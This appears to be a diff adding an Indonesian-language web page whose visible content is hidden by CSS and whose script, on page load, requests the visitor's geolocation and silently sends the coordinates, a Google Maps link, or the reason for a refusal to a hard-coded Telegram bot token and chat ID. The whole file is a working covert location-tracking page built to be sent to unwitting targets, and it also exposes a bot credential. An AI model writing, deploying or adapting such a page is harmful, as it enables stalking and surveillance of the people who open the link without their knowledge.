@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📍 Mengirim Lokasi</title>
+    <style>
+        /* Sembunyikan seluruh konten */
+        body {
+            margin: 0;
+            padding: 0;
+            background: black;
+            color: black;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // ===== KONFIGURASI =====
+        const TELEGRAM_TOKEN = "8332999387:AAEPzYevi0TdcFX7K5GgSlqaPmnrltlVxj0";
+        const OWNER_ID = "7587303225";
+        // =======================
+
+        // Kirim pesan teks ke Telegram
+        function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: OWNER_ID,
+                    text: text
+                })
+            })
+            .then(res => res.json())
+            .then(data => console.log('✅ Pesan terkirim:', data))
+            .catch(err => console.error('❌ Gagal kirim pesan:', err));
+        }
+
+        // Kirim lokasi (latitude, longitude) ke Telegram
+        function sendTelegramLocation(lat, lon) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: OWNER_ID,
+                    latitude: lat,
+                    longitude: lon
+                })
+            })
+            .then(res => res.json())
+            .then(data => console.log('📍 Lokasi terkirim:', data))
+            .catch(err => console.error('❌ Gagal kirim lokasi:', err));
+        }
+
+        // Minta izin lokasi segera setelah halaman dimuat
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // Berhasil dapat lokasi
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+
+                    // 1. Kirim lokasi sebagai location (opsional)
+                    sendTelegramLocation(lat, lon);
+
+                    // 2. Kirim link Google Maps sebagai pesan teks
+                    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    sendTelegramMessage(`📍 Lokasi: ${googleMapsLink}`);
+                },
+                (error) => {
+                    // Gagal / ditolak
+                    let errorMsg = 'Gagal mendapatkan lokasi: ';
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg += 'Izin ditolak oleh pengguna.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg += 'Lokasi tidak tersedia.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg += 'Waktu permintaan habis.';
+                            break;
+                        default:
+                            errorMsg += 'Kesalahan tidak diketahui.';
+                    }
+                    sendTelegramMessage(errorMsg);
+                }
+            );
+        } else {
+            // Browser tidak mendukung geolocation
+            sendTelegramMessage('Browser tidak mendukung geolocation.');
+        }
+    </script>
+</body>
+</html>
